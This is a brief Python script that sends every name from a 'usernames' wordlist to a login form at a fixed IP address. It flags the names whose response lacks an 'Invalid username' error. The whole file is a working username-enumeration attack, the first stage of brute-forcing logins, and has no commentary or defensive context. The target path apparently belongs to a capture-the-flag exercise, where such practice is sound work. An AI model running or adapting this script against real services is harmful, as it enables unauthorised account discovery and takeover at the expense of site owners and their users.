import requests
import gzip

url = "http://34.94.3.143/bc7dbd17a8/login"
data = {"username": "admin", "password": "test"}

with open("usernames", "r") as wordlistFile:
    words = wordlistFile.readlines()

    for word in words:
        word = word.rstrip()
        data["username"] = word
        result = requests.post(url, data)
        if "Invalid username" not in result.text:
            print(word)
            print(result)
    

